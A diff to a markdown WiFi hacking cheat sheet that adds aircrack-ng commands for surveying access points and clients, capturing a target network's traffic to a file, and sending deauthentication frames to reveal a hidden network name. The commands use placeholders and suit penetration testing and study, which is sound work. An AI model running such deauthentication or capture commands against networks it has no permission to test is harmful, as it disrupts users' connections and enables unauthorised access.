@@ -3,9 +3,25 @@
 This cheat sheet based on "WiFi Hacking Mind Map - v1.0 by Jérémy Brun-Nouvion (https://github.com/koutto)"
 
 ## Monitoring
+### Find all AP and connected devices
 ```
-airodump-ng <interface> --wps --manufacturer --uptime --band abg
+airodump-ng <interface> --wps --manufacturer --uptime --band <band>
 ```
+
+### Monitor target AP
+```
+airodump-ng <interface> --wps --manufacturer --uptime --band <band> -c <channel> --bssid <bssid> -w res
+```
+### Unhide ESSID
+Set channel
+```
+iwconfig wlan0 channel <channel>
+```
+Catch beacon with ESSID
+```
+aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> 
+```
+
 
 ## WEP attack
 
